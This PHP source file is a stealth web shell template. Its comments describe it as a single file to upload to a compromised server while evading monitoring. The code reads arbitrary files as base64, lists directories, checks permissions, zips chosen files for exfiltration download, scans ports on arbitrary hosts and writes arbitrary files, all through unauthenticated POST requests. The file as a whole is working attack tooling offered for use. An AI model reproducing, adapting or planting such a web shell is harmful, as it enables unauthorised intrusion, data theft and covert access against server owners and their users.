<?php
/*
 * Version: 1.0.0
 * Build: 2024-04-13
 * Last change: 2024-04-13
 * Author: @Ebalo <https://github.com/ebalo55>
 * Minimum PHP version: 5.3
 * Description:
 * This template is used to generate a PHP script that can be used to perform various operations, stealthily, on a server.
 * The idea is to have a single PHP file that can be uploaded to a server and then accessed to perform various operations.
 * Everything should be as stealthy as possible, meaning that the operations should not be visible to the user or any
 * monitoring system without rising any uncommon process tree nor disk operation.
 * The possibility to get discovered always exists, but the goal is to make it as hard as possible.
 */

// Features name constants
define("FILE_EXTRACTION", "__FEAT_FILE_EXTRACTION__");
define("DIRECTORY_LISTING", "__FEAT_DIRECTORY_LISTING__");
define("PERMISSION_CHECK", "__FEAT_PERMISSION_CHECK__");
define("EXFILTRATE", "__FEAT_EXFILTRATE__");

/**
 * Define the enabled features
 *
 * @var array<string, array{title: string, description: string}> $ENABLED_FEATURES
 */
$ENABLED_FEATURES = array(
    FILE_EXTRACTION   => array(
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
    ),
    DIRECTORY_LISTING => array(
        "title"       => "Directory listing",
        "description" => "List all files and folders in a directory and optionally its subdirectories.",
    ),
    PERMISSION_CHECK  => array(
        "title"       => "Permission check",
        "description" => "Check access permission for a folder and its children.",
    ),
    EXFILTRATE        => array(
        "title"       => "Exfiltrate",
        "description" => "Exfiltrate data from the server in a password protected zip archive.",
    ),
);

/**
 * Check if the request method is POST
 *
 * @return bool
 */
function isPost() {
    return $_SERVER['REQUEST_METHOD'] === 'POST';
}

/**
 * Returns the classes to apply to the navigation item highlighted because it's the current page
 *
 * @param $current_page string Current page
 * @param $checking_page string Page to check if it's the current page
 *
 * @return string
 */
function htmlHighlightActivePage($current_page, $checking_page) {
    if ($current_page === $checking_page) {
        return "bg-zinc-800 text-white";
    }
    return "text-zinc-400";
}

/**
 * Create a navigation link
 *
 * @param $page string Page to link to
 * @param $current_page string Current page to highlight
 * @param $label string Label to display
 *
 * @return string
 */
function makeNavLink($page, $current_page, $label) {
    ob_start();
    ?>
    <li>
        <a href="?page=<?php echo $page ?>"
           class="flex gap-x-3 rounded p-2 text-sm font-semibold leading-6
           <?php echo htmlHighlightActivePage($current_page, $page) ?>
           "
           id="nav-<?php echo $page ?>"
        >
            <?php echo $label ?>
        </a>
    </li>
    <?php
    return ob_get_clean();
}

/**
 * Create a page header
 *
 * @param $title string Title of the page
 * @param $description string Description of the page
 *
 * @return string
 */
function makePageHeader($title, $description) {
    ob_start();
    ?>
    <div class="lg:flex lg:items-center lg:justify-between">
        <div class="min-w-0 flex-1">
            <h2 class="text-2xl font-bold leading-7 text-zinc-900 sm:truncate sm:text-3xl sm:tracking-tight">
                <?php echo $title ?>
            </h2>
            <div class="mt-1 flex flex-col sm:mt-0 sm:flex-row sm:flex-wrap sm:space-x-6">
                <div class="mt-2 flex items-center text-sm text-zinc-500">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
                         stroke-width="1.5" stroke="currentColor"
                         class="mr-1.5 h-5 w-5 flex-shrink-0 text-zinc-400">
                        <path stroke-linecap="round" stroke-linejoin="round"
                              d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z"/>
                    </svg>
                    <?php echo $description ?>
                </div>
            </div>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create an input field
 *
 * @param $type string Type of the input
 * @param $label string Label for the input
 * @param $name string Name of the input
 * @param $placeholder string Placeholder for the input
 * @param $description string Description of the input
 * @param $required bool Whether is the input required
 *
 * @return string
 */
function makeInput($type, $label, $name, $placeholder, $description, $required = false) {
    ob_start();
    if ($type !== "textarea") {
        ?>
        <div class="flex flex-col gap-y-2">
            <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                <?php echo $label ?>
                <?php
                if ($required) {
                    echo "<sup class='text-red-500'>*</sup>";
                }
                ?>
            </label>
            <input type="<?php echo $type ?>"
                   id="<?php echo $name ?>"
                   name="<?php echo $name ?>"
                   placeholder="<?php echo $placeholder ?>"
                <?php
                if ($required) {
                    echo "required";
                }
                ?>
                   class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400">
            <p class="text-sm text-zinc-500">
                <?php echo $description ?>
            </p>
        </div>
        <?php
    }
    else {
        ?>
        <div class="flex flex-col gap-y-2">
            <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                <?php echo $label ?>
                <?php
                if ($required) {
                    echo "<sup class='text-red-500'>*</sup>";
                }
                ?>
            </label>
            <textarea id="<?php echo $name ?>"
                      name="<?php echo $name ?>"
                      placeholder="<?php echo $placeholder ?>"
                <?php
                if ($required) {
                    echo "required";
                }
                ?>
                      class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400"
                      rows="5"
            ></textarea>
            <p class="text-sm text-zinc-500">
                <?php echo $description ?>
            </p>
        </div>
        <?php
    }
    return ob_get_clean();
}

/**
 * Create a checkbox field
 *
 * @param $name string Name of the checkbox
 * @param $label string Label for the checkbox
 * @param $description string Description of the checkbox
 * @param $value string Value of the checkbox, default is "y"
 *
 * @return string
 */
function makeCheckbox($name, $label, $description, $value = "y") {
    ob_start();
    ?>
    <div class="relative flex items-start">
        <div class="flex h-6 items-center">
            <input id="<?php echo $name ?>" name="<?php echo $name ?>" type="checkbox"
                   class="h-4 w-4 text-indigo-600 border-zinc-300 rounded focus:ring-indigo-600 "
                   value="<?php echo $value ?>">
        </div>
        <div class="ml-3 text-sm leading-6 flex flex-col select-none">
            <label for="<?php echo $name ?>" class="font-medium text-zinc-900 w-full cursor-pointer">
                <?php echo $label ?>
            </label>
            <p class="text-zinc-500 cursor-pointer" onclick="document.getElementById('<?php echo $name ?>').click()">
                <?php echo $description ?>
            </p>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a form with the given elements
 *
 * @param $action string Action to perform when the form is submitted
 * @param $elements string[] Elements to include in the form
 * @param $method string Method to use for the form, default is "post"
 *
 * @return string
 */
function makeForm($action, $elements, $method = "post") {
    ob_start();
    ?>
    <form action="<?php echo $action ?>" method="<?php echo $method ?>" class="flex flex-col gap-y-6 max-w-xl mt-8">
        <?php
        foreach ($elements as $element) {
            echo $element;
        }
        ?>
        <button type="submit"
                class="rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
    hover:bg-zinc-700 transition-all duration-300">
            Run operation
        </button>
    </form>
    <?php
    return ob_get_clean();
}

/**
 * Create a page with the given elements
 *
 * @param $elements string[] Elements to include in the page
 * @param $current_page string Current page to highlight in the navigation
 *
 * @return string
 */
function makePage($elements, $current_page) {
    global $ENABLED_FEATURES;
    ob_start();
    ?>
    <html lang="en">
    <head>
        <title>__TITLE__</title>
        <style>__CSS__</style>
        <link rel="stylesheet" href="./compiled.css">
    </head>
    <body class="bg-white">
    <div class="fixed inset-y-0 z-50 w-72 flex flex-col">
        <div class="flex flex-grow flex-col gap-y-5 overflow-y-auto bg-zinc-900 px-6 pb-4">
            <div class="flex items-center h-16 shrink-0">
                <h1 class="text-2xl text-white">__TITLE__</h1>
            </div>
            <nav class="flex flex-1 flex-col">
                <ul role="list" class="flex flex-1 flex-col gap-y-7">
                    <li>
                        <ul role="list" class="-mx-2">
                            <?php
                            foreach ($ENABLED_FEATURES as $feature => $definition) {
                                echo makeNavLink($feature, $current_page, $definition["title"]);
                            }
                            ?>
                        </ul>
                    </li>
                </ul>
            </nav>
        </div>
    </div>
    <div class="ml-72">
        <main class="py-10">
            <div class="container px-16">
                <?php
                foreach ($elements as $element) {
                    echo $element;
                }
                ?>
            </div>
        </main>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a code highlight element
 *
 * @param $code string|int|float Code to highlight
 *
 * @return string
 */
function makeCodeHighlight($code) {
    ob_start();
    ?>
    <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all"><?php echo $code ?></code>
    <?php
    return ob_get_clean();
}

// Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
// on the page except the operation result.
$isolated_ops = array(FILE_EXTRACTION,);

// Check if the request is not POST and the operation is not in the isolated operations list, then render the page
if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
    $page = isset($_GET['page']) ? $_GET['page'] : '';

    $content = "";

    switch ($page) {
        case FILE_EXTRACTION:
            $content = makePage(
                array(
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"]
                    ),
                    makeForm(
                        $_SERVER["REQUEST_URI"],
                        array(
                            makeInput(
                                "text",
                                "Path",
                                "__PARAM_1__",
                                "C://path/to/file.txt",
                                "Fully qualified path to the file to extract.",
                                true
                            ),
                            makeCheckbox(
                                "__PARAM_2__",
                                "Preview",
                                "Display preview of the file content if it's larger than 100kb."
                            ),
                            makeCheckbox(
                                "__PARAM_3__",
                                "Export",
                                "Export the file even if larger than 100kb."
                            ),
                        )
                    ),
                ),
                $page
            );
            break;
        case DIRECTORY_LISTING:
            $content = makePage(
                array(
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"]
                    ),
                    makeForm(
                        $_SERVER["REQUEST_URI"],
                        array(
                            makeInput(
                                "text",
                                "Path",
                                "__PARAM_1__",
                                "C://path/to/directory or \\\\network\\path\\to\\directory",
                                "Fully qualified path to the directory to list.",
                                true
                            ),
                            makeInput(
                                "text",
                                "Depth",
                                "__PARAM_2__",
                                "5",
                                "How many levels deep to list, where " . makeCodeHighlight(0) .
                                " is the current directory and " . makeCodeHighlight("inf") .
                                " means to list all.",
                                true
                            ),
                        )
                    ),
                ),
                $page
            );
            break;
        case PERMISSION_CHECK:
            $content = makePage(
                array(
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"]
                    ),
                    makeForm(
                        $_SERVER["REQUEST_URI"],
                        array(
                            makeInput(
                                "text",
                                "Path",
                                "__PARAM_1__",
                                "C://path/to/directory or \\\\network\\path\\to\\directory",
                                "Fully qualified path to the directory to check.",
                                true
                            ),
                        )
                    ),
                ),
                $page
            );
            break;
        case EXFILTRATE:
            $content = makePage(
                array(
                    makePageHeader(
                        $ENABLED_FEATURES[$page]["title"],
                        $ENABLED_FEATURES[$page]["description"]
                    ),
                    makeForm(
                        $_SERVER["REQUEST_URI"],
                        array(
                            makeInput(
                                "textarea",
                                "Paths",
                                "__PARAM_1__",
                                "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
                                "List of file/folders to include in the zip archive.<br/>" .
                                "Concatenate to the path " . makeCodeHighlight(",with_tree") .
                                " to include all files and folders within a given directory.<br/>" .
                                "Concatenate to the path " . makeCodeHighlight(",extensions=txt|doc|xlsx") .
                                " to include only files with the given extensions.",
                                true
                            ),
                            makeInput(
                                "password",
                                "Password",
                                "__PARAM_2__",
                                "password",
                                "Password to protect the zip archive.",
                                true
                            ),
                        )
                    ),
                ),
                $page
            );
            break;
    }

    echo $content;
    ?>
    <!--
    <form action="<?php /*echo $_SERVER["REQUEST_URI"] */ ?>" method="post">
    <div class="flex">
    <label for="op">Which operation to run?</label>
    <select id="op" name="op">
    <option value="zip_multiple_recursive">Zip multiple files/folder</option>
    <option value="port_scan">Port scanner</option>
    <option value="write_file">Write file</option>
    </select>
    </div>
    <div class="hidden" id="zip_multiple_recursive">
    <hr/>
    <div>
    <label for="zip_multiple_content">List of file/folders to include in the zip archive, optionally
    concatenate to the path <code>,with_tree</code> to include all files and folders within a given
    directory: </label>
    <br/>
    <br/>
    <textarea id="zip_multiple_content" name="zip_multiple_content" rows="10"></textarea>
    <br/>
    <br/>
    </div>
    </div>
    <div class="hidden" id="port_scan">
        <hr/>
        <div class="flex">
            <label for="port_scan_host">Host: </label>
            <input id="port_scan_host" name="port_scan_host" type="text">
        </div>
        <div class="flex">
            <label for="port_scan_start_port">Start port (min: 1): </label>
            <input id="port_scan_start_port" name="port_scan_start_port" type="number">
        </div>
        <div class="flex">
            <label for="port_scan_end_port">End port (max: 65535): </label>
            <input id="port_scan_end_port" name="port_scan_end_port" type="number">
        </div>
    </div>
    <div class="hidden" id="write_file">
        <hr/>
        <div class="flex">
            <label for="write_file_path">Path: </label>
            <input id="write_file_path" name="write_file_path" type="text">
        </div>
        <div class="flex">
            <label for="write_file_content">Content: </label>
            <textarea id="write_file_content" name="write_file_content"></textarea>
        </div>
    </div>
    <input type="submit" value="Submit"/>
    </form>

    <pre>-->
    <?php
    // Exit the html rendering block
}

///////////////////////
// CODE BLOCK START  //
///////////////////////

function check_and_print_file($filepath, $preview = "n", $export = "n") {
    if (!file_exists($filepath)) {
        echo "Error: File '$filepath' does not exist.\n";
        return;
    }

    $filesize = filesize($filepath);

    if ($filesize < 102400) { // Less than 100Kb
        $content = file_get_contents($filepath);
        echo "File size: " . $filesize . " bytes\n";
        echo "Base64 content:\n" . base64_encode($content) . "\n";
    }
    else {
        echo "File size: " . $filesize . " bytes (exceeds 100Kb).\n";

        if (strtolower($preview) === 'y') {
            $preview_content = fopen($filepath, "r");
            $read            = fread($preview_content, 10240); // Read 10Kb
            fclose($preview_content);
            echo "Preview:\n" . $read . "\n";
        }

        if (strtolower($export) === 'y') {
            echo "Exporting full file...\n";
            $content = file_get_contents($filepath);
            echo "Base64 content:\n" . base64_encode($content) . "\n";
        }
    }
}

function zip_folder_base64($folder_path, $allowed_extensions = []) {
    if (!is_dir($folder_path)) {
        echo "Error: '$folder_path' is not a directory.";
        return;
    }

    $zip      = new ZipArchive();
    $zip_name = tempnam(sys_get_temp_dir(), ''); // Generate temporary zip filename
    $zip->open($zip_name, ZipArchive::CREATE);

    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($folder_path),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($files as $file) {
        if ($file->isDir()) {
            continue;
        }
        $filePath     = $file->getRealPath();
        $relativePath = str_replace($folder_path . DIRECTORY_SEPARATOR, '', $filePath);

        $fileInfo  = new SplFileInfo($filePath);
        $extension = strtolower($fileInfo->getExtension());

        if (empty($allowed_extensions) || in_array($extension, $allowed_extensions)) {
            $zip->addFile($filePath, $relativePath);
        }
    }

    $zip->close();

    $zip_data = file_get_contents($zip_name);
    unlink($zip_name); // Delete temporary zip file

    return base64_encode($zip_data);
}

function getDirContents($dir, &$results = []) {
    $files = scandir($dir);

    foreach ($files as $key => $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
        if (!is_dir($path)) {
            $results[] = $path;
        }
        else {
            if ($value != "." && $value != "..") {
                getDirContents($path, $results);
                $results[] = $path;
            }
        }
    }

    return $results;
}

function check_permissions($path) {
    if (!is_readable($path)) {
        echo "Error: Cannot access '$path' (no read permission).\n";
        return;
    }

    $perms      = fileperms($path);
    $readable   = ($perms & 0444) ? 'R' : '-';                   // Check read bits
    $writable   = ($perms & 0222) ? 'W' : '-';                   // Check write bits
    $executable = ($perms & 0111) && !is_dir($path) ? 'X' : '-'; // Check execute bits (only for files)

    echo "$path: $readable$writable$executable\n";

    if (is_dir($path) && is_readable($path)) {
        $dir_handle = opendir($path);
        while (($file = readdir($dir_handle)) !== false) {
            if ($file !== '.' && $file !== '..') {
                $sub_path = "$path/$file";
                if (is_readable($sub_path)) {
                    echo "- $sub_path\n";
                }
                else {
                    echo "- (No read permission for $sub_path)\n";
                }
            }
        }
        closedir($dir_handle);
    }
}

function get_shortest_common_path($paths) {
    if (empty($paths)) {
        return null;
    }

    $shortest_path = $paths[0]; // Initialize with first path

    foreach ($paths as $path) {
        $common_path       = '';
        $path_segments     = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
        $shortest_segments = explode(DIRECTORY_SEPARATOR, trim($shortest_path, DIRECTORY_SEPARATOR));

        $min_length = min(count($path_segments), count($shortest_segments));
        for ($i = 0; $i < $min_length; $i++) {
            if ($path_segments[$i] === $shortest_segments[$i]) {
                $common_path .= $path_segments[$i] . DIRECTORY_SEPARATOR;
            }
            else {
                break;
            }
        }

        $shortest_path = $common_path; // Update shortest path if shorter common path found
    }

    return rtrim($shortest_path, DIRECTORY_SEPARATOR); // Remove trailing separator if present
}

function create_zip($content) {
    $zip      = new ZipArchive();
    $zip_name = tempnam(sys_get_temp_dir(), 'archive');

    if ($zip->open($zip_name, ZipArchive::CREATE) !== true) {
        echo "Error: Could not create temporary archive.";
        return;
    }

    $lines            = explode("\n", $content);
    $path_replacement = get_shortest_common_path($lines);
    foreach ($lines as $line) {
        $parts     = explode(',', trim($line)); // Split line by comma
        $path      = isset($parts[0]) ? $parts[0] : '';
        $recursive = isset($parts[1]) && strtolower($parts[1]) === 'with_tree';

        if ($path) {
            if (is_file($path)) {
                $zip->addFile(
                    $path,
                    preg_replace("^\\\\", "", str_replace('\\', '/', basename($path)))
                ); // Add file with original name
            }
            else {
                if (is_dir($path) && is_readable($path)) {
                    add_directory_to_zip($path, $zip, $recursive, $path_replacement . DIRECTORY_SEPARATOR);
                }
                else {
                    //echo "Error: '$path' is not a valid file or readable directory.\n";
                }
            }
        }
    }

    $zip->close();

    $file_size  = filesize($zip_name);
    $chunk_size = 4096; // Adjust chunk size as needed

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream'); // Adjust content type if needed
    header('Content-Disposition: attachment; filename="' . basename($zip_name) . '"');
    header('Content-Transfer-Encoding: chunked');
    header('Content-Length: ' . $file_size); // Optional: Set content length for progress tracking

    $file_handle = fopen($zip_name, 'rb');

    while (!feof($file_handle)) {
        $chunk = fread($file_handle, $chunk_size);
        echo $chunk; // Add CRLF after each chunk
        flush();     // Flush output buffer after sending each chunk
    }

    fclose($file_handle);
    unlink($zip_name); // Delete temporary zip file;
}

function add_directory_to_zip($dir, $zip, $recursive, $cleanup_path = "") {
    $dir_handle = opendir($dir);
    while (($file = readdir($dir_handle)) !== false) {
        if ($file !== '.' && $file !== '..') {
            $sub_path = "$dir/$file";
            if (is_file($sub_path)) {
                $zip->addFile(
                    $sub_path,
                    preg_replace(
                        "^\\\\",
                        "",
                        str_replace('\\', '/', str_replace($cleanup_path, '', $sub_path))
                    )
                ); // Add with relative path within zip
            }
            else {
                if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
                    add_directory_to_zip($sub_path, $zip, $recursive, $cleanup_path);
                }
            }
        }
    }
    closedir($dir_handle);
}

function portScan($host, $startPort, $endPort) {
    // Loop through the port range
    for ($port = $startPort; $port <= $endPort; $port++) {
        // Attempt to connect to the host on the current port
        $socket = @fsockopen($host, $port, $errno, $errstr, 1);

        // Check if the connection was successful
        if ($socket) {
            // The port is open
            fclose($socket);
            echo "Port $port: OPEN\n";
        }
        else {
            // The port is closed or unreachable
            echo "Port $port: CLOSED / UNREACHABLE (err: $errstr)\n";
        }
        flush();
    }
}

function appendOperationRedirector($operation) {
    echo "<script>
        // NOTE: This will run before the onload script
        const url = new URL(window.location)
        url.searchParams.set('page', '$operation')
        window.history.pushState(window.history.state, '', url.href)
    </script>";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $operation = $_POST["op"];

    switch ($operation) {
        case "file_extraction":
            check_and_print_file(
                $_POST["file_extraction_filepath"],
                $_POST["file_extraction_preview"],
                $_POST["file_extraction_export"]
            );
            appendOperationRedirector($operation);
            break;
        case "folder_export":
            $base64_zip = zip_folder_base64(
                $_POST["folder_export_pathname"],
                explode(",", $_POST["folder_export_extensions"])
            );
            echo "Folder zipped as base64:\n" . $base64_zip;
            appendOperationRedirector($operation);
            break;
        case "dir_listing":
            $result = getDirContents($_POST["dir_listing_pathname"]);
            foreach ($result as $e) {
                echo "$e\n";
            }
            appendOperationRedirector($operation);
            break;
        case "folder_perm_check":
            check_permissions($_POST["folder_perm_check_pathname"]);
            appendOperationRedirector($operation);
            break;
        case "zip_multiple_recursive":
            $content = trim($_POST['zip_multiple_content']);
            create_zip($content);
            appendOperationRedirector($operation);
            break;
        case "port_scan":
            portScan($_POST['port_scan_host'], $_POST['port_scan_start_port'], $_POST['port_scan_end_port']);
            appendOperationRedirector($operation);
            break;
        case "write_file":
            file_put_contents($_POST['write_file_path'], $_POST['write_file_content']);
            appendOperationRedirector($operation);
            break;
        default:
            echo "Unrecognized operation '$operation'";
            break;
    }
}

// Check if the request is not POST and the operation is not in the isolated operations list, then render the page end
if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
    ?>
    </pre>
    </body>
    </html>
    <?php
}
?>